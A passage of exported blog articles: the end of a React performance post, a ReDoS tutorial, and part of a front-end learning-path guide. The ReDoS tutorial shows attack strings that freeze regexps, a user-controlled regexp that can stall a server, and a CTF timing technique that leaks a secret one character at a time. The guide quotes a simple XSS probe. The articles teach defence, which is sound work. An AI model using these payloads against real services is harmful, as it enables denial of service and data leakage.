after reading this article and carefully considering it, I realized that it’s better not to use it if you don’t know the underlying principles. Therefore, I suggested that we switch to using Component for everything, and slowly adjust when we encounter performance issues that need to be optimized. Finally, I’d like to share a quote I really like from the article on optimizing nested React components (which also discusses the issues with PureComponent): Just because you can optimize, doesn’t mean you should. References: High Performance React: 3 New Tools to Speed Up Your Apps reactjs - Reconciliation reactjs- Optimizing Performance React is Slow, React is Fast: Optimizing React Apps in Practice Efficient React Components: A Guide to Optimizing React Performance","link":"/2018/01/15/en/react-performance-immutable-and-scu/"},{"title":"ReDoS: Attacks using regexp","text":"Regular expressions (hereinafter referred to as regexp), are mainly used for string matching. After writing a pattern, it can be used to match text that meets the rules. Whether it’s a phone number, email, or ID number, regexp can be used to perform basic format validation to ensure that the string format matches specific rules. Although regexp is convenient, if it is not written properly, it may cause some input validations to be bypassed and evolve into a security issue. In addition to this, there is another type of problem that will cause issues, which is ReDoS, the full name is: Regular expression Denial-of-Service, due to the denial of service attack caused by regular expressions. Before talking about ReDoS, let’s first mention what is DoS. For example, suppose a website framework does not parse HTTP requests well and crashes when encountering special characters, causing the server to restart. At this time, attackers can continuously send such requests that will cause the website to crash, causing the server to keep restarting, which is a DoS attack. If you want to divide it further, you can also divide it into which layer is being attacked, such as the network layer or the application layer, etc. This article is about attacks on the application layer. Most of the attacks you see in network news are DDoS, with an additional D in front, meaning distributed, and most of them are attacks on the network layer. As can be seen from the DoS example we mentioned earlier, basically, it is because the website itself has problems, such as not considering special situations, etc., that attackers can use it, and DDoS is more like: “I will find a bunch of people to overload you regardless of whether you have problems or not.” To give a real-life example, suppose you run a snack shop that sells common items like dry noodles and boiled greens. Because it takes a lot of time to look at the customer’s menu and what they ordered, and it feels impersonal to order with a mobile phone, you ordered a “menu reading robot” to help you look at the customer’s order. At this time, I deliberately drew symbols on the menu, but some places looked normal, making it difficult to read the menu, and the robot’s recognition function was not done well and could not be interpreted, so it stopped. This is called DoS, exhausting resources with one’s own strength. I will find a hundred people to go to your place, and each person will draw a lot of blank menus and throw them to the robot, making the robot overwhelmed and unable to handle other customers’ menus. This is called DDoS. In short, DoS is usually “able to cause service interruption with a small amount of resources”, while DDoS is “using a lot more resources to directly knock out your service.” Okay, let’s talk about DoS. As can be seen from the example above, when your program itself has some problems, it is the easiest to have problems. If this premise is met, it is easy to use a simple method to knock out your service. ReDoS relies on poorly written regular expressions to achieve this. Without further ado, let’s take an exampleThe fastest way is to look at the example: console.time('test'); /(a|a?)+$/.test('a'.repeat(25) +'b'); console.timeEnd('test'); // test: 2128.498046875 ms A 26-character string takes 2 seconds to match. By the way, the time required for this regexp is calculated in multiples, and one more character requires 4 seconds, then 8 seconds, 16 seconds, and so on. So why does this regexp take so long? This is related to the implementation and principle of the regexp engine. I haven’t studied the details yet, so I won’t mislead the public. But simply put, the regexp engine must traverse all possibilities before it can find that the string does not match, so it takes so long. In summary, if the regexp is not written well, it will consume a lot of time when used. Actual caseYou may think, is it so easy to write regexp wrong? Yes, a lot of libraries have had ReDoS vulnerabilities, and someone has compiled a detailed list: Awesome ReDoS Security For example, CKEditor used to have a regexp that detects whether it is a picture URL. After passing in a carefully constructed string, it takes 6 seconds to execute: // from: https://github.com/ckeditor/ckeditor5/commit/e36175e86b7f5ca597b39df6e47112b91ab4e0a0 const IMAGE_URL_REGEXP = new RegExp( String( /^(http(s)?:\\/\\/)?[\\w-]+(\\.[\\w-]+)+[\\w._~:/?#[\\]@!$&amp;'()*+,;=%-]+/.source + /\\.(jpg|jpeg|png|gif|ico|webp|JPG|JPEG|PNG|GIF|ICO|WEBP)\\??[\\w._~:/#[\\]@!$&amp;'()*+,;=%-]*$/.source ) ); console.time('test'); IMAGE_URL_REGEXP.test('a.' + 'a'.repeat(100000)) console.timeLog('test') // test: 6231.137939453125 ms Although the length of the string is 100,000, if it is changed to a version without problems, the result can be obtained in less than 1 millisecond: // from: https://github.com/ckeditor/ckeditor5/commit/e36175e86b7f5ca597b39df6e47112b91ab4e0a0 const IMAGE_URL_REGEXP = new RegExp( String( /^(http(s)?:\\/\\/)?[\\w-]+\\.[\\w._~:/?#[\\]@!$&amp;'()*+,;=%-]+/.source + /\\.(jpg|jpeg|png|gif|ico|webp|JPG|JPEG|PNG|GIF|ICO|WEBP)(\\?[\\w._~:/#[\\]@!$&amp;'()*+,;=%-]*)?$/.source ) ); console.time('test'); IMAGE_URL_REGEXP.test('a.' + 'a'.repeat(100000)) console.timeLog('test') // test: 0.570068359375 ms In JavaScript, these matching codes are all run on the main thread. If it is a webpage, the screen will freeze directly, and if it is executed with Node.js, the server will also be stuck and unable to handle other requests. How to know if there is a risk of ReDoS?There are some ready-made tools that can help, and the one I use most often is this: https://devina.io/redos-checker Just throw the regexp in, and it will tell you if there are any problems. If there are, it will even provide a test string for you to test again. However, sometimes there may be false positives, where it thinks there is a problem but there isn’t, or there may actually be a problem, but the attack string it provides doesn’t work. Therefore, it is still recommended to test the payload it provides again after testing to confirm. Application of ReDoS in attacksThe previous discussion was all about “the regexp is already written, and the user can control the input”. In this case, all you have to do is find the problematic regexp and generate an attack string. There is another situation where “the user can control the regexp”. For example, suppose there is a website that provides a search function for users, and you can pass in a regexp, and the server will return whether there is a username that matches this regexp. The server’s implementation is roughly as follows (written arbitrarily, just to convey the idea): app.get('/search', (req, res) => &#123; const q = req.query.q return users .filter(user => new RegExp(q).test(user.username)) &#125;) This dangerous function not only allows attackers to get all the usernames, but also has the risk of ReDoS. For example, when /((([^m]|[^m]?)+)+)+$/ encounters &quot;username&quot;, it takes nearly 4 seconds to complete: console.time('test'); /((([^m]|[^m]?)+)+)+$/.test('username') console.timeEnd('test'); // test: 3728.89990234375 ms As long as you continue to extend the regexp in the same pattern, you can make this entire block of code run for more than 30 seconds or longer, paralyzing the entire server. Another common situation when playing CTF is that you can also pass in a regexp, but the server won’t tell you if it was successful. You can only judge based on the time difference, and ReDoS is very useful in this case: console.time('CTF&#123;a'); console.log(/CTF&#123;[a](((((.*)*)*)*)*)!/.test('CTF&#123;this_is_flag&#125;')) console.timeEnd('CTF&#123;a'); // CTF&#123;a: 0.071ms console.time('CTF&#123;t'); console.log(/CTF&#123;[t](((((.*)*)*)*)*)!/.test('CTF&#123;this_is_flag&#125;')) console.timeEnd('CTF&#123;t'); // CTF&#123;t: 24.577s By passing in a carefully constructed regexp, you can use the time difference to know what the first character is. Finally, a simple defense method is mentioned. The most fundamental solution is not to write flawed regexps. First, learn which patterns should be used as little as possible, and you can grasp the general direction. In addition, it seems that some people have done some automated tools to help scan the regexps that appear in the code, which is also a way to prevent problems before they occur. SummaryI personally think that ReDoS is a pretty interesting attack method. I never thought that such an effect could be achieved by relying on regexps. The first time I learned about this attack, I seemed to be still a developer. I occasionally saw libraries with this vulnerability being used, but I didn’t care much about it at the time. Later, I encountered this thing again in information security, and I felt that it was quite interesting. This article is more like my personal notes, just wanting to record some payloads while the memory is still fresh, so it’s easier to find them later. Finally, here are some reference materials and further reading. Interested readers can take a look: HackTricks - Regular expression Denial of Service - ReDoS OWASP: Regular expression Denial of Service - ReDoS snyk: ReDoS","link":"/2023/06/12/en/redos-regular-expression-denial-of-service/"},{"title":"Solid Front-end Learning Path and Resource Recommendations","text":"(The original article was written on Medium, and I’m backing it up here.) Although I have always been clear about my preferred learning methods and paths, and have turned what I think is suitable into a course outline for teaching, few people seem to look at that outline, and it does not explain the reasons behind it in detail. Therefore, I feel it is necessary to write this article to describe what I think is a “solid” front-end learning path. Before we begin, there are a few things that must be explained. First of all, this article is aimed at people with no programming background. If you already have a programming background, you can skip the relevant units. In addition, for people with no background who want to switch careers, this article is definitely not the “fastest” career guide. If you want to be quick, I believe that many of the things mentioned in the article do not need to be learned, as some job thresholds are so low that they scare me. But focusing only on speed will only make an unstable foundation even more unstable. Even if you find a job, then what? Will you stop improving yourself? Will you let your skills stay where they are? If you want to do this job for a long time, you will eventually face these questions, and the foundations that were not learned well in the past will come back to haunt you when you are confused about why you can’t move forward. Everyone’s definition of “essential” and “solid” is different. For example, some people may think that as long as they complete the subjects taught in computer science, everything else is not as important. This article is about the learning path that I think is solid. This article will tell you what I think you should learn and in what order. Most importantly, I will provide reasons. You can judge for yourself whether the reasons behind it are reasonable and decide whether to follow this order of learning. The reasons are the most important. If you have time, you can refer to these two articles I wrote before: What are we really learning when we learn to code? There is no magic in my classroom The learning path below is basically adapted from my previous course outline, and is designed based on the principles mentioned above. In addition, most of the following is actually telling you what tools you should learn, but please remember that when learning tools, you must also think about why you need to use these tools and what problems they solve. This article only focuses on the field of front-end web development, and does not include the basic skills of other engineers (such as problem decomposition or problem definition). Regarding the recommended resources, I only recommend resources that I have tried and really think are good, so not every section will have them. If there are none, you can search for them yourself through Google. Learning how to find information is also an important part. The article below will be very long because I have to write reasons and goals. I will first provide the learning path: Command Line Usage Git Usage npm, Node.js, and JavaScript Programming Basics Unit Testing and Jest Basic Network Concepts HTML and CSS JavaScript, DOM, and Event Mechanisms Asynchronous and AJAX Basic Backend PHP and MySQL Information Security Concepts Learn Backend Framework Express Backend Deployment jQuery and Bootstrap CSS Preprocessors Asynchronous History: Callbacks, Promises, and Async&#x2F;Await In-depth Understanding of JavaScript and Browser-related Mechanisms gulp and webpack Object-oriented Programming Choose one of React&#x2F;Vue&#x2F;Angular Next, I will provide a detailed introduction for each point. 1. Command Line UsageThis is the first step in bringing you closer to the computer and the most important foundation before starting to learn programming. First, let’s briefly talk about what the command line is. Basically, it’s what you see in movies when you see a computer expert typing a bunch of commands on a black background with white text. The first step is to learn how to use these basic commands. My Terminal, which has been modified to look nicer Reasons for LearningThe reason why this step is placed at the beginning is twofold. The first is that it allows you to switch from a graphical user interface (GUI) to a command line interface (CLI). To put it simply, in the past, if you wanted to see what files were on your desktop, you would use the mouse to click on the file manager or Finder. You operated using these graphical interfaces. But the reason why the command line is different is that it operates using text. Just like in the screenshot above, by typing a magical command ls -al, you can list all the files in a folder. The essence of programming is the same as using the command line: Communicating with the computer using commands The second reason is that it is very important in software development. If you are in a design-related field, you may have software like PS, AI, or Sketch in your computer, and you can just double-click to use them. But for us programmers, many tools do not provide a graphical interface, and you can only use commands (command line) to operate them. Learning ObjectivesJust learn common commands (such as cd, ls, rm, mv, etc.). 2. Using GitAssuming you have a boss who loves to make changes, he asks you to draw a picture. So after you finish drawing, you save the picture as v1.ai and show it to your boss, but he says no, he wants more changes, so you have v2.ai. Later, the boss says, “Just change the color and it will be good enough,” so you make the changes and save it as final.ai. But who knows, after the boss sees it, he says he wants more changes, and he wants to start from v2 (this is when you will be glad you saved it), so you have to open the v2 file, make the changes, and save it as v2-2.ai. The rest of the story doesn’t need to be said, final.ai, real-final.ai, fucking-final.ai, real-real-final.ai, and finally, there are so many files that you don’t know which one is the final version, and you get a headache. This is my resume folder, and I don’t even know which one is the latest… Version control is a difficult thing, especially with this traditional copy and paste method, which only makes things confusing. If one person gets confused, it’s okay, it just takes a little more time to find it, but if a whole team collaborates on a document, the problem is much bigger. And software engineers are an industry that cannot escape team collaboration and version control. For example, the current version is v2 stable version, and Xiao Ming continues to develop new features for v3. But one day, a bug was found in v2! Xiao Hua, who is responsible for fixing it, is very efficient and fixes the bug in less than a day. But the problem is that the new feature that has already been written cannot be released because v3 has not been completed yet, but after fixing the bug, users need to be updated to the new version quickly, so what should be done? This is where version control is needed. After talking so much, I just want to illustrate the importance of version control in programming (especially in multi-person collaboration), and the most famous program that helps you do version control is called Git. Learning ReasonsIt is listed as the second thing to learn because after learning Git, you can experience version control for the code you will write in the future. Although some difficulties that only arise in team collaboration may not be experienced by a single person, it is okay to start with the basics. Learning Objectives Learn the basic concepts of Git: what is a repository, what is a commit, what is staged… Learn to use basic commands such as add, commit, status, log, etc. Understand the difference between Git and GitHub and learn to use push, pull, clone, fetch Learn to use branch and checkout If you want to learn how to use branches, I highly recommend Learn Git Branching. 3. npm, Node.js, and JavaScript Programming BasicsJavaScript is just a programming language that can currently run on two main environments. The first environment is well known, called the browser, and JavaScript can be used to manipulate the screen. The second environment is called Node.js, which can operate independently of the browser. After installing Node.js, you can enter the command node index.js to execute the index.js file on your computer. Here, I hope that everyone will not touch the browser first, but run their own JavaScript code in the Node.js environment. Therefore, this stage is to install the Node.js environment on your computer and learn the basics of the programming language (variables, conditionals, loops, functions, etc.) through JavaScript. The recommended learning resource is Modern JavaScript Tutorial. So what is npm? Before talking about npm, let’s talk about what a library is. In the programming field, it is not called a library, but a “function library”, which is a collection of many functions. Simply put, some functions are not used very often, right? Maybe I will use it, you will use it, and Cyclops will use it. It is better to share the joy of sharing than to have it alone. I wrote a lot of commonly used functions today, which can be used by others, and everyone is happy. This is called “I wrote a library for others to use.” npm stands for Node Package Manager. The package here is similar to the library mentioned above, and it is translated into “package” in Chinese. It is a service that manages Node.js-related packages, so you can publish your own packages on it, or install packages written by others through npm. Reasons for LearningSome people may ask, “Why not learn HTML and CSS first?” when they see this. My reason is that if you want to go into web front-end development, you must learn the JavaScript programming language. It’s just a matter of whether you learn it early or late. HTML and CSS can quickly give learners a sense of accomplishment because they can immediately see what they have learned, which can supplement their motivation to learn. When learning something new, you always have the most perseverance at the beginning, and then it slowly fades away, and procrastination sets in. Choosing to learn JavaScript at this time is because of this. I think it’s better to learn it while the motivation is still there, and then learn HTML and CSS later, while also replenishing the motivation. The reason npm is important is that you will use npm frequently in the future. At this stage, you can find some simple packages to try out and practice reading documentation. Learning ObjectivesIf you want to test whether you have a good foundation in programming languages, you can verify it through some simple small problems or by writing some Codewar problems. As long as you can write the basic problems mentioned in them, it’s okay. For npm, you only need to know the following concepts: What is package.json What does npm install do 4. Unit Testing and JestIn the previous stage, it was mentioned that you can write some small problems to test whether your programming foundation is qualified. On websites like Codewar, it will help you correct and tell you where the errors are, but how do you test it on your own computer? It’s simple, just come up with a few test cases yourself, and then use console.log to print out whether the answer is correct or not. Thanks to https://carbon.now.sh for providing the service Yes, this is possible, but it’s not a good method. Because you have to use your eyes to judge which test case is wrong. If you have more test cases, it’s also difficult to see whether the answer is correct at once. Make way! Let the professionals come! (Suddenly realized that this sentence also has a sense of age) Jest is a framework specifically designed to test JavaScript code. As long as you use the structure and functions specified by it, you can easily write files for testing, and there will be beautiful test reports. And this way of testing the input and output of functions is called unit testing. If the test is done well, the program is not afraid of being broken. Because as long as you run the test, you can see whether the code is written correctly. Reasons for LearningThe reason why unit testing is placed here is because I think it is the most appropriate. In the previous stage, a lot of small functions were written, and after learning Jest, you can add unit tests to these functions to experience the power of testing. Learning Objectives Know how to use Jest to test the input and output of a function Try to come up with various test cases 5. Basic Concepts of the InternetBefore officially entering the most famous HTML and CSS in web front-end development, there is one last thing to do, which is to know a little about the basic concepts of the Internet. In this stage, you must know things including but not limited to: What is front-end? What is back-end? What is Request? What is Response? What is HTTP? What are the HTTP methods? Common HTTP status codes (200, 301, 302, 400, 404, 500…) What is an API? After understanding these concepts, you can try to find some ready-made APIs, and then use some Node.js packages such as request or axios to try to connect them. It’s okay if you don’t understand it very clearly, but you must have the basic concepts. Because a lot of beginners have almost no concept of this aspect, which leads to spending a lot of time finding the wrong point when problems occur, and it turns out that the error is not where they imagined it to be. Here are some more theoretical courses that can help you understand the basic concepts: Crash Course [CS101] Beginner’s Introduction to Computer Science and Coding Magic Reasons for LearningI put these internet concepts at the forefront because I have seen too many problems in various technology-related communities. People ask questions about front-end in back-end communities, thinking it’s related to the framework used in the back-end; or they think it’s a front-end problem when it’s actually a network problem. I believe that these problems are caused by a lack of understanding of the overall network concept. Learning Objectives Know what Request and Response are. Know what DNS is. Know what localhost and 127.0.0.1 are. Know what API is. Be able to use Node.js to write a program that connects to an API. Know the basic HTTP methods. Know the basic HTTP status codes, such as 200, 301, 400, 404, 500. 6. HTML and CSSAfter laying the groundwork, we can finally start learning HTML and CSS. The former is the skeleton of a webpage, and the latter is the clothing. HTML is just a file composed of specific formats and tag combinations. You must choose the appropriate tags to represent the content. Understanding some common tags is enough, and there are two key points to learning. The first is to make your HTML semantically correct. For example, if you have a list today, using &lt;ul&gt; and &lt;li&gt; is much more appropriate than using a bunch of &lt;div&gt;. How do you check? Don’t look at the screen, just look at the tags in the HTML source code. Try to see if you can tell what each block represents or how important it is. If you can, it means you wrote it well. The second is to pay a little attention to SEO (Search Engine Optimization), which is actually quite related to the previous point. Search engines need to crawl many web pages and parse them based on the webpage’s source code. SEO is to make them understand your webpage and know what the focus of your webpage is. For example, suppose there are two web pages now. The first one only has &lt;div&gt; tags, and the second one uses &lt;h1&gt; to write out the title. Which one can the robot understand? Of course, it’s the second one, because h1 represents the title, and it will regard the content inside as one of the main topics of this webpage. Or to put it this way, tags are like the layout of writing an article. If you don’t use them well, there is no bold, no title, and even no period. All the text looks the same at a glance, and you can’t tell which is the title and which is the subtitle. Using tags well is high-quality layout, which is clear at a glance, and everything is very clear. HTML can only do basic layout for webpages. If you need further beautification, you need CSS. With CSS, you can give different styles to different parts of the webpage, such as making the background of block A red and the background of block B green, and so on. This brings out the first key point of CSS: how do I select the part I want? This is called CSS selector. There are some rules to learn. You can select the elements you want through tags, class, id, or more complex ways. After learning some basics, you can review and strengthen your understanding of selectors through the super cute and fun game CSS dinner. Then it’s related to layout. You need to know what the box model is, and know the differences between position and display properties. These are all important things for layout. Why are they important? Because if you don’t understand the above mechanisms, you can’t do layout. The box model represents how the browser looks at each element, and display determines whether these elements can be arranged on the same line. Position allows you to place elements wherever you want. In addition, you must also know how to use Flexbox for layout. You can learn through the fun games Flexbox Froggy or Flex Pirate. If you have time, you can also look at the newer property grid and play this little game: Grid Garden. Finally, you need to know how to do different layouts on different screen sizes. The core concept is to “apply different CSS to different sizes.” For example, if you originally had a two-column layout, when you view it on a mobile phone, you can set the width of these two columns to 100%, and it becomes a two-row layout instead of side by side, which is more in line with the usage habits of mobile phones. To do this, you need to use media queries to load different CSS according to different conditions (such as screen width, height, etc.). The key points of learning CSS have been mentioned before, but theory is just theory after all. You must not think that you can understand what those theories mean just by reading tutorials. I used to read the explanation of position thousands of times, but I never understood what position: absolute was positioning based on and what it was used for. It wasn’t until one day when I had to implement a function that put a cross in the upper right corner of the picture that I really knew why I needed absolute. Apart from CSS, everything else is the same. It’s useless to just read it. You’re better off opening the browser and playing around with those properties yourself, even if you’ve read the explanation of the position a hundred times. Recommended resources include: html &amp; css is hard Learn to Code HTML &amp; CSS MarkSheet HTML &amp; CSS: The Way to Website Design and Optimization (recommended by my students) Learning ReasonsIf you want to start learning front-end development, you must know HTML and CSS because these two are the foundation of web pages. Learning Objectives Know how to use semantic tags Know the basic CSS Selector Know what the box model is, and the relationship between padding, margin, border, width&#x2F;height, and it Know the difference between block, inline, and inline-block display properties Know the difference between static, relative, absolute, fixed, and sticky position properties Know how to use Flexbox for layout Know how to use media queries 7. JavaScript and DOM and Event MechanismDo you remember I said earlier that JavaScript can basically run in two places? Browsers and Node.js. After learning HTML and CSS, you can try to write JavaScript on the browser. The biggest difference between writing on Node.js and the browser is that You can use JavaScript to manipulate the screen Anything visible on the page can be changed. You can add elements, delete elements, change styles, and add different event listeners to different elements. For example, you can listen to the click event of a button, and when the user clicks the button, you will know, and you can respond to this event, such as popping up an alert. There are two key points to learning this part. The first is how JavaScript manipulates the screen? It is through something called the Document Object Model (DOM). Simply put, the browser converts the HTML elements on the screen into objects and provides you with an API to manipulate them. For example, document.querySelector(‘#aaa’) returns the #aaa DOM object, and you only need to change it, and the elements on the screen will change accordingly. So the first key point of learning is how to manipulate DOM objects. You need to learn how to add, modify, and delete these objects. The second key point will be on the event mechanism. How do I add an event listener to an element? How do I remove it? What happens if I add two? In addition, the event mechanism of the DOM is a bit more complicated than you think. For example, if you have two overlapping elements, the outside is blue called Blue, and the inside is red called Red: Event Transmission Mechanism Figure When you click on the Red box, the click event of Red is triggered. But not only that, the click event of Blue is also triggered! It’s actually quite reasonable to think about it, because Red is inside Blue, the blue box is not hollow, it’s just covered by red. This is the key point to learn in this part: the operation of the event mechanism. For details, please refer to the learning objectives below. After learning this part, you can make any “non-network-related” application. For example, Sudoku games or Gomoku games that can be played on a single machine can be made because they are just a collection of screens and events. For example, how to make Gomoku? Draw the chessboard with HTML and CSS Detect the click event of the chessboard, draw a chess piece where you click Determine whether the chess pieces on the chessboard are connected If yes, the game is over If not, switch to the other player’s turn and return to step 2 Don’t think that you have only learned these things, and these are the essence. As long as you can listen to events, change the screen, what function can’t be done? When you break down what you want to do, you will find that it is just a combination of these operations. There is no magic in it. All you need is a little imagination. Learning ReasonsIf you want to learn JavaScript on the browser, you must talk about DOM to manipulate the screen. But as I said before, I don’t want to talk about HTML and CSS first. I want to talk about “programming language JavaScript” first. At this time, learning in the Node.js environment is a better method because it does not involve DOM or other front-end things, it is just a simple programming language. I believe this has two benefits: Knowing that JavaScript can run not only on browsers. Knowing that JavaScript is just a programming language, and the DOM is something provided by the execution environment (browser). For example, Node.js does not have a DOM. This way, the execution environment and JavaScript are not confused. Learning Objectives Know the basic operations of the DOM, such as insertion, deletion, and attribute modification. Know how events are propagated. Know what capturing and bubbling are. Know the functions and differences between e.preventDefault and e.stopPropagation. Know the difference between e.target and e.currentTarget. Know what event delegation is and when to use it. 8. Asynchronous and AJAXAfter learning about the event mechanism in the previous section, the last piece of the puzzle is communication between JavaScript and the backend. We will use a technology called AJAX, which sounds difficult, but it is actually using the Web API provided by the browser to send requests to the backend and receive responses. This part is super important for front-end development because there are many concepts to understand, and we will go through them one by one. The first is the Same-Origin Policy of the browser. When you use JavaScript to send a request, the browser has some restrictions for security reasons. Different requests have different restrictions, but the general principle is “if the backend does not allow you to do this, you will not get a response.” Therefore, backend assistance is usually required to enable CORS (Cross-Origin Resource Sharing). You must understand what the Same-Origin Policy is, why it exists, and what it restricts. You must also understand how to use XMLHttpRequest or Fetch to connect to APIs. The second is that since we mentioned AJAX, you must also know what asynchronous means. Some people may be misled by the literal meaning of synchronous, which looks like “doing things at the same time.” However, in the field of computer science, synchronous actually means “can only complete one thing at a time, and must wait for the previous thing to finish before doing the next thing.” What happens if the API connection with the backend is synchronous? It’s terrible. If the backend is slow and takes 10 seconds to return a response, JavaScript must wait for 10 seconds before executing the next command. This is impossible. You can’t let the entire screen freeze for 10 seconds, so the first A in AJAX represents Asynchronous, which means communicating with the server asynchronously and exchanging data. So how do you get data asynchronously? This is where the concept of callback functions comes in. You prepare a function and tell the browser, “Hey, come over here, remember to call me when you’re ready.” In addition to AJAX, timers (such as setTimeout) are also asynchronous. You can’t just wait in place for three seconds and then execute it. You must do other things in the meantime, and the timer will be triggered after three seconds. But as everyone knows, JavaScript execution is single-threaded, and only one thing can be done at a time. How can it be asynchronous? This involves the mechanism of the Event Loop, and I strongly recommend this video, which explains it very well: What the heck is the event loop anyway? | Philip Roberts | JSConf EU. Learning ReasonsFirst, let’s talk about why we recommend learning this way. Because we already have the concept of the network and the event mechanism, and there is no problem with the basic JavaScript. Understanding asynchronous related operations is the last piece of the puzzle for understanding JavaScript and an important part of front-end web development. So AJAX is placed here, and after the foundation is laid, we will learn AJAX and understand the related concepts of asynchronous. Learning Objectives Know the difference between asynchronous and synchronous. Know what the Same-Origin Policy is. Know how to access cross-domain resources (CORS). Know how to use XMLHttpRequest or Fetch to connect to APIs. Understand the Event Loop. 9. Basic Backend PHP and MySQLNext, we will learn basic backend development, using pure PHP without any PHP frameworks. Another focus is the database. We will use the most common MySQL, and the combination of PHP + MySQL has a lot of ready-made tools, such as XAMPP, which directly helps you build the entire environment. Regarding MySQL, don’t go and learn ORM (Object Relational Mapping). Please write SQL Query obediently, learn how to do CRUD (Create, Read, Update, Delete), and decide the data format of the columns by yourself. Reasons to Learn Backend DevelopmentSome of you may ask: why learn backend development? Well, have you noticed the four words in the title? “Web Frontend” represents both “frontend in web” and “web and frontend”. Websites are divided into frontend and backend. If you only understand frontend, you will never understand the entire website. As I mentioned in the fifth point of the basic network concepts, many people lack a holistic concept, which leads to locating problems incorrectly or not knowing where the problem is. The main reason to learn backend development is to fill in the missing concepts, so that when problems occur, you know exactly where the problem lies. I don’t recommend learning Ruby on Rails, Laravel, or Express. Instead, I recommend starting with PHP - without using any frameworks. Because it’s simple. One PHP file is responsible for one page. Whatever you echo in the file will be output on the screen. It’s very simple and easy to learn. If you have some programming knowledge or have looked up related information, you may ask, “But won’t the code become messy if it’s written like this? There’s no structure at all!” Yes, you’re right - but that’s intentional. If all the men in the world looked like Takeshi Kaneshiro, would Takeshi Kaneshiro still be handsome? No. Takeshi Kaneshiro is handsome because you have seen many people who are less attractive than him, so you know that Takeshi Kaneshiro is handsome. This is a comparison. The same goes for writing code. If you haven’t written bad code before, how do you know what good code looks like? You won’t know, and you might not even recognize good code. You must write enough bad code to know what makes good code great. That’s why I recommend starting with pure PHP. As you progress, you will write messy, difficult-to-modify, and difficult-to-maintain code. But only then will you know what makes frameworks great when you encounter them. Learning Objectives Understand what frontend and backend are. Know what a database is. Understand basic SQL syntax, including Select, Insert Into, Delete, and Update. Be able to use PHP to create a simple message board or blog. 10. Information Security ConceptsLearning backend development has another benefit: you will have a clearer understanding of how common information security vulnerabilities occur and how to defend against them. If you follow my advice and learn pure PHP, you are likely to create websites with SQL Injection, XSS (Cross-site Scripting), and CSRF (Cross-site request forgery) vulnerabilities. No matter how many articles you read, you won’t feel it until your own website has a vulnerability. One of my hobbies is attacking websites that students think are well-defended, to show them the importance of information security. Common security vulnerabilities are usually caused by unexpected user input. For example, if you have a message board that allows people to leave messages, and the backend directly prints the message content, you might think it’s okay. Until one day someone leaves &lt;script&gt;alert(1)&lt;/script&gt;, and everyone who opens the message board pops up a window. Then you realize, “Oh my god, someone can enter such strange things.” Learning Objectives Know the difference between hashing and encryption. Know what SQL Injection is and how to prevent it. Know what XSS is and how to prevent it. Know what CSRF is and how to prevent it. 11. Learning the Express Backend FrameworkYou’ve already suffered enough with pure PHP, written enough bad code, and created enough vulnerabilities. Now I recommend that you start learning a framework. You can learn any framework, but I recommend Express because it’s lightweight and uses JavaScript. The goal of this section is simple: experience the difference between having a framework and not having one, and become familiar with the elements (such as MVC) and overall structure of the backend framework. For frontend engineers, learning Express has another benefit: you can do any side project you want in the future, and you can write the backend yourself. This is a headache for many frontend engineers who want to do side projects but don’t know backend development, and don’t know where to get data. If you have time, you can also learn an ORM, such as Sequelize. You will find that it’s much faster and simpler than SQL queries. But please remember, frameworks like Express or ORMs like Sequelize have no magic behind them. At the bottom, they are the basics you learned in PHP, such as parsing requests, fetching parameters, returning responses, and executing SQL queries. After learning frameworks, you can abandon pure PHP and use frameworks for development. Because you are a developer who knows what frameworks are doing and why they are used, not just someone who only knows how to use frameworks but can’t even write SQL queries. Learning ReasonsExperience the difference between having and not having a framework and become familiar with the backend MVC architecture, which will make the difference between having and not having a structure clearer. Learning Objectives Know what MVC is. Know what ORM is. 12. Backend DeploymentSince you have started learning backend, let’s complete the entire backend process! The next thing to learn is deployment. You must rent a machine yourself (AWS and Google Cloud have some discounts for the first year, and DigitalOcean, which has no discounts, has the cheapest machine for five dollars a month), and then upload the code. You also need to buy a domain and learn how to set up DNS to map the domain to the machine you purchased. After completing this, you can have a personal website, and all your works can be placed on your website. Learning ReasonsThis is the last part of the backend in the learning path, and there will be no more backend content in the future. You may think that as a web front-end engineer, is it necessary to learn so much backend? You are wrong. These are not too much. I think they are just the tip of the iceberg. The backend is also very deep, and these backend concepts are what I think many front-end engineers lack. As I said before, a website is composed of both front-end and back-end, and neither side is complete without the other. You are not required to learn these backends to become a backend engineer, but to enable you to clearly know where the problem is when there is a problem with the website. Learning Objectives Know how to set up a domain (A, CNAME). Know how to use SSH to remotely connect to your own host. Know how to deploy your own program. Mid-term SummaryAfter learning all of the above, I think the basics are okay. With what you have learned, you can implement any visible website. I’m not kidding. It’s just that the function may be a bit simple and the speed may be a bit slow, but you can really do it. Any website is composed of the following basics, and the corresponding technologies learned are in parentheses: Backend server and business logic (PHP + Apache) Database (MySQL) Front-end page and interaction (HTML + CSS + JavaScript) Image source: https://tw.beanfun.com/kartrider/img_newhand&#x2F;s01.jpg Have you ever played KartRider? Anyway, it’s a racing game. The current situation is that you have learned how to drive, how to drift, and how to use nitro, and you have also learned how to run common maps. You can definitely reach the finish line, but only the speed is different. So the next thing to learn is only for one purpose: Make you run faster. 13. jQuery and BootstrapIn the previous paragraphs related to front-end, almost no libraries were mentioned, but the recommended learning path for the next part will include many libraries and tools. The first is the famous jQuery. You don’t need to learn too much, just learn the basics. I think jQuery is still very useful, and it is a very important part of the history of front-end development. Next is Bootstrap. If you just want to get started, I think it’s not difficult to learn. Just add the CSS of the component according to the official document. Anyway, it is a UI library that can help you make the interface more beautiful and consistent. As mentioned earlier, the basics have been learned, and the content that follows will focus on “how to run faster.” I think these two libraries meet this condition, and using jQuery and Bootstrap can improve your development speed. Learning ReasonsThe reason for learning jQuery is that although it is not so popular now, it is still very useful in small projects, and through jQuery, you can reduce some tedious native operations and save time. If you just want to get started with jQuery, I think it won’t take too long to learn, so it’s better to learn it. Bootstrap can beautify your interface and speed up layout. In addition to learning new tools, it also trains your ability to read documents. Today, if you want to use jQuery to do AJAX, which function should you use? How to use the class to apply the Bootstrap button? These can only be found through Google or official documents. Reading documents is also one of the essential skills for engineers. Learning ObjectivesI think with these two things, it’s no problem to write a TodoList. 14. CSS PreprocessorsOne of the ways to “run faster” is to stand on the shoulders of giants and use the useful tools developed by predecessors, which can make development faster and code easier to maintain. CSS preprocessors are such a thing that allows you to write CSS in a programming-like way, defining variables, running loops, and even calling functions. Well-known preprocessors include SaSS&#x2F;SCSS, Less, and Stylus, among others. Just pick one to learn from. Learning this is necessary because few people write CSS directly now, and instead use CSS preprocessors to compile. Learning ReasonsHelps you write better-maintained CSS while also improving development efficiency. Learning Objectives Understand the purpose and principles of CSS preprocessors Be able to rewrite CSS previously written 